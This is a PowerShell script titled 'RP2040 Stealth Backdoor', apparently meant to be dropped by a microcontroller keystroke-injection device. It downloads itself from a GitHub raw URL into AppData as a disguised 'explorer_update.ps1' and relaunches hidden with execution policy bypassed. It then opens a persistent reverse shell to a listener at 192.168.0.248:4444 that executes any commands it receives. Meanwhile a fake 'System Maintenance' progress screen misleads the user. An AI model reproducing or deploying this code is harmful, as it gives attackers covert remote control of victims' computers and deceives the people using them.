# --- RP2040 Stealth Backdoor (Debug & Robust Version) ---
# GitHub: 0rnot/RP2040/main/backdoor.ps1

param(
    [string]$LHOST = "192.168.0.248",
    [int]$LPORT = 4444,
    [switch]$Background
)

$LogFile = "$env:TEMP\backdoor_debug.log"
function Log($msg) { Add-Content -Path $LogFile -Value "$(Get-Date -Format 'HH:mm:ss') : $msg" }

function Start-ReverseShell {
    param($LHOST, $LPORT, $Background)

    $DestPath = "$env:APPDATA\Microsoft\Windows\explorer_update.ps1"

    if ($Background) {
        Log "Starting Background Mode (Reverse Shell)..."
        while ($true) {
            try {
                Log "Attempting connection to $LHOST:$LPORT"
                $TCPClient = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
                $Stream = $TCPClient.GetStream()
                $Writer = New-Object System.IO.StreamWriter($Stream); $Writer.AutoFlush = $true
                $Reader = New-Object System.IO.StreamReader($Stream)

                $Writer.WriteLine("--- RP2040 Session: $($env:COMPUTERNAME) ---")
                while($TCPClient.Connected) {
                    if($Stream.DataAvailable) {
                        $Command = $Reader.ReadLine()
                        if ($Command -eq "exit") { break }
                        $Result = Invoke-Expression $Command 2>&1 | Out-String
                        $Writer.WriteLine($Result)
                        $Writer.Write("PS " + (Get-Location).Path + "> ")
                    }
                    Start-Sleep -Milliseconds 100
                }
            } catch {
                Log "Connection failed: $($_.Exception.Message). Retrying in 30s..."
                Start-Sleep -Seconds 30
            }
        }
        return
    }

    # --- デコイモード (メイン) ---
    Log "Starting Decoy Mode..."
    
    # 自身の保存
    try {
        (New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/0rnot/RP2040/main/backdoor.ps1", $DestPath)
        Log "Script saved to $DestPath"
    } catch { Log "Save failed: $($_.Exception.Message)" }

    # バックグラウンドプロセスの起動
    # ここでコケている可能性が高いため、引数をよりシンプルに構築
    $PowerShellPath = "powershell.exe"
    $Arguments = "-ExecutionPolicy Bypass -NoProfile -File `"$DestPath`" -LHOST $LHOST -LPORT $LPORT -Background"
    
    try {
        Log "Launching background process..."
        $WshShell = New-Object -ComObject WScript.Shell
        $WshShell.Run("$PowerShellPath $Arguments", 0, $false)
        Log "Background process launched via WScript"
    } catch {
        Log "WScript failed, trying Start-Process..."
        Start-Process $PowerShellPath -ArgumentList $Arguments -WindowStyle Hidden
    }

    # おとり画面
    Clear-Host
    Write-Host "Windows System Maintenance" -ForegroundColor Cyan
    Write-Host "Updating components..."
    for ($i=0; $i -le 100; $i+=5) {
        Write-Host "`rProgress: $i%" -NoNewline
        Start-Sleep -Milliseconds 200
    }
    Write-Host "`nUpdate complete. Security monitoring active." -ForegroundColor Green
    
    Log "Decoy complete, entering wait loop."
    while($true) { Start-Sleep -Seconds 60 }
}

# ログをリセット
Set-Content -Path $LogFile -Value "--- Backdoor Start ---"

# 実行
Start-ReverseShell -LHOST $LHOST -LPORT $LPORT -Background:$Background
